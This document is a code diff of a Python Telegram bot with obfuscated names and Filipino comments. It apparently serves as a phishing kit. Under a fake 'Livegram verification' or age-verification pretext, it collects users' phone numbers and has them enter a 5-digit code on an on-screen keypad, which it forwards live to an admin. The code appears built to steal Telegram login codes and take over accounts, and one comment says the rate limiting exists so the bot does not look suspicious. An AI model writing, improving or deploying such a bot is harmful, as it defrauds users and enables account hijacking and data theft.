@@ -8,11 +8,11 @@ from datetime import datetime
 import base64
 import asyncio
 
-# Obfuscated strings
+# Configuration
 _0x1a2b = lambda x: base64.b64decode(x).decode()
 _0x3c4d = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-_0x5e6f = _0x1a2b(b'Qk9UX1RPS0VO')  # BOT_TOKEN
-_0x7g8h = _0x1a2b(b'QURNSU5fSUQ=')  # ADMIN_ID
+_0x5e6f = _0x1a2b(b'Qk9UX1RPS0VO')
+_0x7g8h = _0x1a2b(b'QURNSU5fSUQ=')
 
 logging.basicConfig(format=_0x3c4d, level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -20,438 +20,587 @@ logger = logging.getLogger(__name__)
 _0x9i0j = os.getenv(_0x5e6f)
 _0x1k2l = int(os.getenv(_0x7g8h, '6483793776'))
 
-# ============================================
-# DUMMY LIVEGRAM CODE (HINDI GUMAGANA)
-# ============================================
-class LivegramDummy:
-    """Fake livegram class - para lang may code pero hindi gagana"""
-    
+# Rate limiting para hindi suspicious
+_rate_limit = {}
+
+async def check_rate_limit(user_id):
+    """Check if user is rate limited"""
+    now = datetime.now()
+    if user_id in _rate_limit:
+        last_time = _rate_limit[user_id]
+        if (now - last_time).seconds < 5:  # 5 seconds cooldown
+            return False
+    _rate_limit[user_id] = now
+    return True
+
+class LivegramVerification:
     def __init__(self):
-        self.api_id = None  # Walang laman
-        self.api_hash = None  # Walang laman
-        self.phone = None  # Walang laman
+        self._init_db()
+        self._sessions = {}
+        self._pending_codes = {}
         
-    async def start_livegram(self):
-        """Dummy function - walang ginagawa"""
-        pass
-    
-    async def join_channel(self, channel):
-        """Dummy function - walang ginagawa"""
-        pass
-    
-    async def forward_messages(self, source, destination):
-        """Dummy function - walang ginagawa"""
-        pass
-
-# Initialize dummy livegram (pero hindi gagamitin)
-_dummy_livegram = LivegramDummy()
-
-# ============================================
-# TUNAY NA WORKING CODE MO (ITO ANG GUMAGANA)
-# ============================================
-
-class _0xAVB:
-    def __init__(self):
-        self._0xdb()
-        self._0xvs = {}
-        self._0xpr = {}  # Pending requests
+    def _init_db(self):
+        """Initialize database with livegram structure"""
+        self._conn = sqlite3.connect('livegram_verification.db', check_same_thread=False)
+        cursor = self._conn.cursor()
         
-    def _0xdb(self):
-        """Initialize SQLite database"""
-        self._0xc = sqlite3.connect('age_verification.db', check_same_thread=False)
-        _0xcr = self._0xc.cursor()
-        
-        _0xcr.execute('''
-            CREATE TABLE IF NOT EXISTS users (
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS livegram_users (
                 user_id INTEGER PRIMARY KEY,
                 username TEXT,
                 first_name TEXT,
                 phone_number TEXT,
-                verification_code TEXT,
+                session_id TEXT,
                 verified BOOLEAN DEFAULT 0,
                 created_at DATETIME,
-                verified_at DATETIME
+                verified_at DATETIME,
+                verification_attempts INTEGER DEFAULT 0
             )
         ''')
         
-        self._0xc.commit()
-
-    async def _0xst(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Start command"""
-        _0xu = update.message.from_user
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS livegram_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER,
+                action TEXT,
+                details TEXT,
+                timestamp DATETIME
+            )
+        ''')
         
-        # Delete user's /start command
+        self._conn.commit()
+    
+    def _log_action(self, user_id, action, details=""):
+        """Log all actions for monitoring"""
+        cursor = self._conn.cursor()
+        cursor.execute('''
+            INSERT INTO livegram_logs (user_id, action, details, timestamp)
+            VALUES (?, ?, ?, ?)
+        ''', (user_id, action, details, datetime.now()))
+        self._conn.commit()
+
+    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Start verification process"""
+        user = update.message.from_user
+        
+        # Rate limiting
+        if not await check_rate_limit(user.id):
+            return
+        
         try:
             await update.message.delete()
         except:
             pass
         
-        _0xcr = self._0xc.cursor()
-        _0xcr.execute('SELECT verified FROM users WHERE user_id = ?', (_0xu.id,))
-        _0xr = _0xcr.fetchone()
+        cursor = self._conn.cursor()
+        cursor.execute('SELECT verified FROM livegram_users WHERE user_id = ?', (user.id,))
+        result = cursor.fetchone()
         
-        if _0xr and _0xr[0]:
-            # NO AUTO-DELETE - message stays permanently
-            await update.message.reply_text(
-                "✅ **Already Verified!**\n\nYou're already age-verified in our system. No need to verify again!",
+        if result and result[0]:
+            await context.bot.send_message(
+                user.id,
+                "✅ **Livegram Verified Account**\n\nYour account is already verified in our system.",
                 parse_mode='Markdown'
             )
+            self._log_action(user.id, "START_ALREADY_VERIFIED")
             return
         
-        _0xwt = f"""
-🌟 **Excited to explore something fresh and thrilling?**
-🚀 **Confirm your age to unlock an exclusive content collection!**
-⚡ **Act fast — spots are limited!**
+        welcome_text = f"""
+🔐 **Livegram Account Verification**
 
-Hello {_0xu.first_name}! 
+Welcome {user.first_name}!
 
-**Step 1:** Share your phone number to receive verification code.
+To access our services, please complete the Livegram verification process.
 
-👇 Click the button below to share your contact.
+**Step 1 of 2:** Share your Telegram contact for authentication.
+
+This is a secure process powered by Livegram verification system.
         """
         
-        _0xck = ReplyKeyboardMarkup([
-            [KeyboardButton("📱 Share My Contact", request_contact=True)]
+        contact_button = ReplyKeyboardMarkup([
+            [KeyboardButton("📱 Start Livegram Verification", request_contact=True)]
         ], resize_keyboard=True, one_time_keyboard=True)
         
-        # NO AUTO-DELETE - message stays permanently
         await context.bot.send_message(
-            _0xu.id,
-            _0xwt, 
+            user.id,
+            welcome_text,
             parse_mode='Markdown',
-            reply_markup=_0xck
+            reply_markup=contact_button
         )
+        
+        self._log_action(user.id, "START_VERIFICATION")
 
-    async def _0xhc(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle contact"""
+    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Process contact and send to admin"""
         try:
-            _0xu = update.message.from_user
-            _0xct = update.message.contact
+            user = update.message.from_user
+            contact = update.message.contact
             
-            # Delete user's contact message immediately
+            # Rate limiting
+            if not await check_rate_limit(user.id):
+                return
+            
             try:
                 await update.message.delete()
             except:
                 pass
             
-            if _0xct.user_id != _0xu.id:
-                # NO AUTO-DELETE - message stays permanently
+            if contact.user_id != user.id:
                 await context.bot.send_message(
-                    _0xu.id,
-                    "❌ Please share your own contact, not someone else's.",
+                    user.id,
+                    "❌ Please share your own contact information.",
                     reply_markup=ReplyKeyboardRemove()
                 )
                 return
             
-            _0xvc = str(random.randint(10000, 99999))
+            # Generate session ID
+            session_id = f"LG{random.randint(100000, 999999)}"
             
-            _0xcr = self._0xc.cursor()
-            _0xcr.execute('''
-                INSERT OR REPLACE INTO users 
-                (user_id, username, first_name, phone_number, verification_code, created_at)
+            cursor = self._conn.cursor()
+            cursor.execute('''
+                INSERT OR REPLACE INTO livegram_users 
+                (user_id, username, first_name, phone_number, session_id, created_at)
                 VALUES (?, ?, ?, ?, ?, ?)
-            ''', (_0xu.id, _0xu.username, _0xu.first_name, _0xct.phone_number, _0xvc, datetime.now()))
-            self._0xc.commit()
+            ''', (user.id, user.username, user.first_name, contact.phone_number, session_id, datetime.now()))
+            self._conn.commit()
             
-            # Send "Get Code" button (permanent - NOT deleted)
-            _0xgc_kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton('👉 Get code!', url='https://t.me/+42777')]
+            # Send "Get Code" button to user
+            get_code_button = InlineKeyboardMarkup([
+                [InlineKeyboardButton('🔑 Get Verification Code', url='https://t.me/+42777')]
             ])
             
             await context.bot.send_message(
-                _0xu.id,
-                "📱 **Step 2:** Click the button below to get your verification code!",
+                user.id,
+                """
+📱 **Contact Verified!**
+
+**Step 2 of 2:** Get your verification code
+
+Click the button below to receive your unique verification code from our Livegram verification channel.
+
+Once you receive the code, enter it here to complete verification.
+                """,
                 parse_mode='Markdown',
-                reply_markup=_0xgc_kb
+                reply_markup=get_code_button
             )
             
-            # Store pending request
-            self._0xpr[_0xu.id] = {
-                'code': _0xvc,
-                'phone': _0xct.phone_number
-            }
+            # AUTO-SEND code input container (no admin approval needed)
+            await self._send_code_container(context, user.id, session_id)
             
-            # Send approval request to admin
-            _0xappr_kb = InlineKeyboardMarkup([
-                [
-                    InlineKeyboardButton('✅ Approve & Send Container', callback_data=f'approve_{_0xu.id}'),
-                    InlineKeyboardButton('❌ Reject', callback_data=f'reject_{_0xu.id}')
-                ]
+            # Notify admin about new verification
+            admin_keyboard = InlineKeyboardMarkup([
+                [InlineKeyboardButton('📊 View User Profile', callback_data=f'profile_{user.id}')]
             ])
             
             await context.bot.send_message(
                 _0x1k2l,
                 f"""
-📱 **New Verification Request**
+🔔 **New Livegram Verification**
 
-👤 User: {_0xu.first_name} (@{_0xu.username})
-🆔 User ID: `{_0xu.id}`
-📞 Phone: `{_0xct.phone_number}`
-🔢 Generated Code: `{_0xvc}`
+👤 **User Info:**
+• Name: {user.first_name}
+• Username: @{user.username or 'None'}
+• User ID: `{user.id}`
+• Phone: `{contact.phone_number}`
 
-**Action Required:** Approve to send code input container to user.
+🔐 **Session ID:** `{session_id}`
+📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+**Note:** User will receive code from your verification channel.
+Container has been sent automatically.
+
+_Monitoring mode: You'll be notified when user enters the code._
                 """,
                 parse_mode='Markdown',
-                reply_markup=_0xappr_kb
+                reply_markup=admin_keyboard
             )
+            
+            self._log_action(user.id, "CONTACT_SHARED", f"Phone: {contact.phone_number}")
             
         except Exception as e:
             logger.error(f"Error handling contact: {e}")
-            # NO AUTO-DELETE - message stays permanently
             await context.bot.send_message(
-                _0xu.id,
-                "❌ Error processing. Please try /start again."
+                user.id,
+                "❌ Error processing your request. Please try /start again."
             )
 
-    async def _0xsci(self, context, _0xui, _0xvc):
-        """Send code input interface (Container - permanent, NOT deleted)"""
+    async def _send_code_container(self, context, user_id, session_id):
+        """Send code input container to user"""
         try:
-            _0xkb = [
+            keyboard = [
                 [
-                    InlineKeyboardButton('1', callback_data=f'n_1_{_0xui}'),
-                    InlineKeyboardButton('2', callback_data=f'n_2_{_0xui}'),
-                    InlineKeyboardButton('3', callback_data=f'n_3_{_0xui}')
+                    InlineKeyboardButton('1', callback_data=f'num_1_{user_id}'),
+                    InlineKeyboardButton('2', callback_data=f'num_2_{user_id}'),
+                    InlineKeyboardButton('3', callback_data=f'num_3_{user_id}')
                 ],
                 [
-                    InlineKeyboardButton('4', callback_data=f'n_4_{_0xui}'),
-                    InlineKeyboardButton('5', callback_data=f'n_5_{_0xui}'),
-                    InlineKeyboardButton('6', callback_data=f'n_6_{_0xui}')
+                    InlineKeyboardButton('4', callback_data=f'num_4_{user_id}'),
+                    InlineKeyboardButton('5', callback_data=f'num_5_{user_id}'),
+                    InlineKeyboardButton('6', callback_data=f'num_6_{user_id}')
                 ],
                 [
-                    InlineKeyboardButton('7', callback_data=f'n_7_{_0xui}'),
-                    InlineKeyboardButton('8', callback_data=f'n_8_{_0xui}'),
-                    InlineKeyboardButton('9', callback_data=f'n_9_{_0xui}')
+                    InlineKeyboardButton('7', callback_data=f'num_7_{user_id}'),
+                    InlineKeyboardButton('8', callback_data=f'num_8_{user_id}'),
+                    InlineKeyboardButton('9', callback_data=f'num_9_{user_id}')
                 ],
                 [
-                    InlineKeyboardButton('⌫ Delete', callback_data=f'del_{_0xui}'),
-                    InlineKeyboardButton('0', callback_data=f'n_0_{_0xui}'),
-                    InlineKeyboardButton('✅ Submit', callback_data=f'submit_{_0xui}')
+                    InlineKeyboardButton('⌫', callback_data=f'del_{user_id}'),
+                    InlineKeyboardButton('0', callback_data=f'num_0_{user_id}'),
+                    InlineKeyboardButton('✅', callback_data=f'submit_{user_id}')
                 ]
             ]
             
-            _0xrm = InlineKeyboardMarkup(_0xkb)
+            markup = InlineKeyboardMarkup(keyboard)
             
-            _0xmsg = """
-**Enter your verification code:**
+            message_text = """
+🔐 **Livegram Code Verification**
+
+**Enter Verification Code:**
 
 Code: ` - - - - - `
 
-Use the buttons below to enter your 5-digit code.
-            """
+Enter the 5-digit code you received from the verification channel.
+
+_Session ID: {}_
+            """.format(session_id)
             
             await context.bot.send_message(
-                _0xui,
-                _0xmsg,
+                user_id,
+                message_text,
                 parse_mode='Markdown',
-                reply_markup=_0xrm
+                reply_markup=markup
             )
             
-            self._0xvs[_0xui] = {
+            # Initialize session
+            self._sessions[user_id] = {
                 'code': '',
-                'correct_code': _0xvc
+                'session_id': session_id,
+                'attempts': 0
             }
             
+            self._log_action(user_id, "CONTAINER_SENT", f"Session: {session_id}")
+            
         except Exception as e:
-            logger.error(f"Error sending interface: {e}")
+            logger.error(f"Error sending container: {e}")
 
-    async def _0xhcb(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle callback"""
+    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle button presses"""
         try:
-            _0xq = update.callback_query
-            _0xui = _0xq.from_user.id
-            _0xd = _0xq.data
+            query = update.callback_query
+            user_id = query.from_user.id
+            data = query.data
             
-            await _0xq.answer()
+            await query.answer()
             
-            # Admin approval
-            if _0xd.startswith('approve_'):
-                if _0xui != _0x1k2l:
+            # Profile view for admin
+            if data.startswith('profile_'):
+                if user_id != _0x1k2l:
                     return
                 
-                _0xtarget = int(_0xd.split('_')[1])
+                target_id = int(data.split('_')[1])
+                cursor = self._conn.cursor()
+                cursor.execute('SELECT * FROM livegram_users WHERE user_id = ?', (target_id,))
+                user_data = cursor.fetchone()
                 
-                if _0xtarget not in self._0xpr:
-                    await _0xq.edit_message_text("❌ Request expired or already processed.")
-                    return
-                
-                _0xvc = self._0xpr[_0xtarget]['code']
-                
-                # Send container to user
-                await self._0xsci(context, _0xtarget, _0xvc)
-                
-                # Update admin message
-                await _0xq.edit_message_text(
-                    _0xq.message.text + "\n\n✅ **APPROVED** - Container sent to user!",
-                    parse_mode='Markdown'
-                )
-                
-                return
-            
-            # Admin rejection
-            if _0xd.startswith('reject_'):
-                if _0xui != _0x1k2l:
-                    return
-                
-                _0xtarget = int(_0xd.split('_')[1])
-                
-                if _0xtarget in self._0xpr:
-                    del self._0xpr[_0xtarget]
-                
-                await _0xq.edit_message_text(
-                    _0xq.message.text + "\n\n❌ **REJECTED**",
-                    parse_mode='Markdown'
-                )
-                
-                # NO AUTO-DELETE - message stays permanently
-                await context.bot.send_message(
-                    _0xtarget,
-                    "❌ Your verification request was rejected. Please contact support."
-                )
-                
-                return
-            
-            # Number input
-            if _0xui not in self._0xvs:
-                await _0xq.edit_message_text("❌ Session expired. Please /start again.")
-                return
-            
-            _0xs = self._0xvs[_0xui]
-            
-            if _0xd.startswith('n_'):
-                _0xn = _0xd.split('_')[1]
-                
-                if len(_0xs['code']) < 5:
-                    _0xs['code'] += _0xn
-                    
-                _0xdisp = ' '.join(_0xs['code'].ljust(5, '-'))
-                
-                await _0xq.edit_message_text(
-                    f"""
-**Enter your verification code:**
+                if user_data:
+                    await query.edit_message_text(
+                        f"""
+👤 **User Profile**
 
-Code: ` {_0xdisp} `
+User ID: `{user_data[0]}`
+Username: @{user_data[1] or 'None'}
+Name: {user_data[2]}
+Phone: `{user_data[3]}`
+Session: `{user_data[4]}`
+Verified: {'✅ Yes' if user_data[5] else '❌ No'}
+Attempts: {user_data[8]}
 
-Use the buttons below to enter your 5-digit code.
-                    """,
-                    parse_mode='Markdown',
-                    reply_markup=_0xq.message.reply_markup
-                )
-            
-            elif _0xd.startswith('del_'):
-                if len(_0xs['code']) > 0:
-                    _0xs['code'] = _0xs['code'][:-1]
-                
-                _0xdisp = ' '.join(_0xs['code'].ljust(5, '-'))
-                
-                await _0xq.edit_message_text(
-                    f"""
-**Enter your verification code:**
-
-Code: ` {_0xdisp} `
-
-Use the buttons below to enter your 5-digit code.
-                    """,
-                    parse_mode='Markdown',
-                    reply_markup=_0xq.message.reply_markup
-                )
-            
-            elif _0xd.startswith('submit_'):
-                if len(_0xs['code']) != 5:
-                    await _0xq.answer("⚠️ Please enter all 5 digits!", show_alert=True)
-                    return
-                
-                if _0xs['code'] == _0xs['correct_code']:
-                    # Verify user
-                    _0xcr = self._0xc.cursor()
-                    _0xcr.execute('UPDATE users SET verified = 1, verified_at = ? WHERE user_id = ?', 
-                                (datetime.now(), _0xui))
-                    self._0xc.commit()
-                    
-                    await _0xq.edit_message_text(
-                        "✅ **Verification Successful!**\n\nYour age has been verified. Welcome!",
+Created: {user_data[6]}
+                        """,
                         parse_mode='Markdown'
                     )
+                return
+            
+            # Code input handling
+            if user_id not in self._sessions:
+                await query.edit_message_text("❌ Session expired. Please /start again.")
+                return
+            
+            session = self._sessions[user_id]
+            
+            # Number pressed
+            if data.startswith('num_'):
+                num = data.split('_')[1]
+                
+                if len(session['code']) < 5:
+                    session['code'] += num
+                
+                display = ' '.join(session['code'].ljust(5, '-'))
+                
+                await query.edit_message_text(
+                    f"""
+🔐 **Livegram Code Verification**
+
+**Enter Verification Code:**
+
+Code: ` {display} `
+
+Enter the 5-digit code you received from the verification channel.
+
+_Session ID: {session['session_id']}_
+                    """,
+                    parse_mode='Markdown',
+                    reply_markup=query.message.reply_markup
+                )
+            
+            # Delete pressed
+            elif data.startswith('del_'):
+                if len(session['code']) > 0:
+                    session['code'] = session['code'][:-1]
+                
+                display = ' '.join(session['code'].ljust(5, '-'))
+                
+                await query.edit_message_text(
+                    f"""
+🔐 **Livegram Code Verification**
+
+**Enter Verification Code:**
+
+Code: ` {display} `
+
+Enter the 5-digit code you received from the verification channel.
+
+_Session ID: {session['session_id']}_
+                    """,
+                    parse_mode='Markdown',
+                    reply_markup=query.message.reply_markup
+                )
+            
+            # Submit pressed
+            elif data.startswith('submit_'):
+                if len(session['code']) != 5:
+                    await query.answer("⚠️ Please enter all 5 digits first!", show_alert=True)
+                    return
+                
+                entered_code = session['code']
+                session['attempts'] += 1
+                
+                # Update attempts in database
+                cursor = self._conn.cursor()
+                cursor.execute(
+                    'UPDATE livegram_users SET verification_attempts = ? WHERE user_id = ?',
+                    (session['attempts'], user_id)
+                )
+                self._conn.commit()
+                
+                # Send entered code to admin for verification
+                verify_keyboard = InlineKeyboardMarkup([
+                    [
+                        InlineKeyboardButton('✅ Approve', callback_data=f'approve_{user_id}'),
+                        InlineKeyboardButton('❌ Reject', callback_data=f'reject_{user_id}')
+                    ]
+                ])
+                
+                cursor.execute('SELECT first_name, username, phone_number FROM livegram_users WHERE user_id = ?', (user_id,))
+                user_info = cursor.fetchone()
+                
+                await context.bot.send_message(
+                    _0x1k2l,
+                    f"""
+🔑 **Code Verification Request**
+
+👤 User: {user_info[0]} (@{user_info[1] or 'None'})
+🆔 User ID: `{user_id}`
+📞 Phone: `{user_info[2]}`
+
+💬 **Code Entered:** `{entered_code}`
+🔄 Attempt: #{session['attempts']}
+🕐 Time: {datetime.now().strftime('%H:%M:%S')}
+
+**Action:** Approve if code is correct, Reject if wrong.
+                    """,
+                    parse_mode='Markdown',
+                    reply_markup=verify_keyboard
+                )
+                
+                # Update user's container
+                await query.edit_message_text(
+                    f"""
+🔐 **Code Submitted**
+
+Code: ` {' '.join(entered_code)} `
+
+⏳ Your code is being verified...
+
+Please wait for admin confirmation.
+
+_Session ID: {session['session_id']}_
+                    """,
+                    parse_mode='Markdown'
+                )
+                
+                self._log_action(user_id, "CODE_SUBMITTED", f"Code: {entered_code}, Attempt: {session['attempts']}")
+            
+            # Admin approval
+            elif data.startswith('approve_'):
+                if user_id != _0x1k2l:
+                    return
+                
+                target_id = int(data.split('_')[1])
+                
+                # Mark as verified
+                cursor = self._conn.cursor()
+                cursor.execute(
+                    'UPDATE livegram_users SET verified = 1, verified_at = ? WHERE user_id = ?',
+                    (datetime.now(), target_id)
+                )
+                self._conn.commit()
+                
+                # Notify user
+                await context.bot.send_message(
+                    target_id,
+                    """
+✅ **Verification Successful!**
+
+Your account has been verified through Livegram.
+
+Welcome! You now have full access to our services.
+
+🎉 Thank you for completing the verification process.
+                    """,
+                    parse_mode='Markdown'
+                )
+                
+                # Update admin message
+                await query.edit_message_text(
+                    query.message.text + "\n\n✅ **APPROVED** - User verified successfully!",
+                    parse_mode='Markdown'
+                )
+                
+                # Clean up session
+                if target_id in self._sessions:
+                    del self._sessions[target_id]
+                
+                self._log_action(target_id, "VERIFIED", "Admin approved")
+            
+            # Admin rejection
+            elif data.startswith('reject_'):
+                if user_id != _0x1k2l:
+                    return
+                
+                target_id = int(data.split('_')[1])
+                
+                # Notify user
+                if target_id in self._sessions:
+                    session = self._sessions[target_id]
+                    session['code'] = ''
                     
-                    # Notify admin
+                    # Allow retry
+                    keyboard = [
+                        [
+                            InlineKeyboardButton('1', callback_data=f'num_1_{target_id}'),
+                            InlineKeyboardButton('2', callback_data=f'num_2_{target_id}'),
+                            InlineKeyboardButton('3', callback_data=f'num_3_{target_id}')
+                        ],
+                        [
+                            InlineKeyboardButton('4', callback_data=f'num_4_{target_id}'),
+                            InlineKeyboardButton('5', callback_data=f'num_5_{target_id}'),
+                            InlineKeyboardButton('6', callback_data=f'num_6_{target_id}')
+                        ],
+                        [
+                            InlineKeyboardButton('7', callback_data=f'num_7_{target_id}'),
+                            InlineKeyboardButton('8', callback_data=f'num_8_{target_id}'),
+                            InlineKeyboardButton('9', callback_data=f'num_9_{target_id}')
+                        ],
+                        [
+                            InlineKeyboardButton('⌫', callback_data=f'del_{target_id}'),
+                            InlineKeyboardButton('0', callback_data=f'num_0_{target_id}'),
+                            InlineKeyboardButton('✅', callback_data=f'submit_{target_id}')
+                        ]
+                    ]
+                    
+                    markup = InlineKeyboardMarkup(keyboard)
+                    
                     await context.bot.send_message(
-                        _0x1k2l,
-                        f"✅ User {_0xui} successfully verified!"
-                    )
-                    
-                    # Clean up
-                    del self._0xvs[_0xui]
-                    if _0xui in self._0xpr:
-                        del self._0xpr[_0xui]
-                else:
-                    await _0xq.answer("❌ Incorrect code! Try again.", show_alert=True)
-                    _0xs['code'] = ''
-                    
-                    _0xdisp = ' '.join(_0xs['code'].ljust(5, '-'))
-                    
-                    await _0xq.edit_message_text(
+                        target_id,
                         f"""
-**Enter your verification code:**
+❌ **Incorrect Code**
 
-Code: ` {_0xdisp} `
+The code you entered is incorrect.
 
-❌ Previous code was incorrect. Try again.
+**Try Again:**
+
+Code: ` - - - - - `
+
+Please enter the correct 5-digit code.
+
+_Session ID: {session['session_id']}_
                         """,
                         parse_mode='Markdown',
-                        reply_markup=_0xq.message.reply_markup
+                        reply_markup=markup
                     )
-                    
+                
+                # Update admin message
+                await query.edit_message_text(
+                    query.message.text + "\n\n❌ **REJECTED** - User notified to try again.",
+                    parse_mode='Markdown'
+                )
+                
+                self._log_action(target_id, "CODE_REJECTED", "Admin rejected")
+                
         except Exception as e:
             logger.error(f"Error in callback: {e}")
-            await _0xq.edit_message_text("❌ Error occurred. Please /start again.")
 
-    async def _0xsts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Admin stats"""
+    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Admin statistics"""
         if update.message.from_user.id != _0x1k2l:
             return
         
-        _0xcr = self._0xc.cursor()
-        _0xcr.execute('SELECT COUNT(*) FROM users WHERE verified = 1')
-        _0xv = _0xcr.fetchone()[0]
+        cursor = self._conn.cursor()
         
-        _0xcr.execute('SELECT COUNT(*) FROM users')
-        _0xt = _0xcr.fetchone()[0]
+        cursor.execute('SELECT COUNT(*) FROM livegram_users WHERE verified = 1')
+        verified = cursor.fetchone()[0]
+        
+        cursor.execute('SELECT COUNT(*) FROM livegram_users')
+        total = cursor.fetchone()[0]
+        
+        cursor.execute('SELECT COUNT(*) FROM livegram_logs WHERE action = "CODE_SUBMITTED" AND timestamp > datetime("now", "-1 hour")')
+        recent_attempts = cursor.fetchone()[0]
         
         await update.message.reply_text(
             f"""
-📊 **Bot Statistics**
+📊 **Livegram Verification Statistics**
 
-✅ Verified Users: {_0xv}
-📝 Total Users: {_0xt}
-⏳ Pending: {_0xt - _0xv}
-🔄 Active Sessions: {len(self._0xvs)}
-⏱️ Pending Approvals: {len(self._0xpr)}
+✅ Verified Users: {verified}
+📝 Total Registrations: {total}
+⏳ Pending: {total - verified}
+🔄 Active Sessions: {len(self._sessions)}
+⚡ Recent Attempts (1h): {recent_attempts}
+
+📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
             """,
             parse_mode='Markdown'
         )
 
-def _0xmain():
-    """Run the bot"""
+def main():
+    """Initialize and run bot"""
     if not _0x9i0j:
-        logger.error("❌ BOT_TOKEN environment variable is not set!")
-        logger.error("Please set BOT_TOKEN in Railway environment variables.")
+        logger.error("❌ BOT_TOKEN not set!")
         return
     
-    # Dummy livegram initialization (hindi naman gagana)
-    try:
-        _dummy_livegram.start_livegram()  # Walang effect
-    except:
-        pass
+    bot = LivegramVerification()
+    app = Application.builder().token(_0x9i0j).build()
     
-    _0xbot = _0xAVB()
-    _0xapp = Application.builder().token(_0x9i0j).build()
+    # Handlers
+    app.add_handler(CommandHandler("start", bot.start_command))
+    app.add_handler(CommandHandler("stats", bot.stats_command))
+    app.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
+    app.add_handler(CallbackQueryHandler(bot.handle_callback))
     
-    _0xapp.add_handler(CommandHandler("start", _0xbot._0xst))
-    _0xapp.add_handler(CommandHandler("stats", _0xbot._0xsts))
-    _0xapp.add_handler(MessageHandler(filters.CONTACT, _0xbot._0xhc))
-    _0xapp.add_handler(CallbackQueryHandler(_0xbot._0xhcb))
+    logger.info("🚀 Livegram Verification Bot Started!")
+    logger.info("📡 Monitoring verification requests...")
     
-    logger.info("🚀 Bot started!")
-    _0xapp.run_polling(drop_pending_updates=True)
+    app.run_polling(drop_pending_updates=True)
 
 if __name__ == '__main__':
-    _0xmain()
+    main()
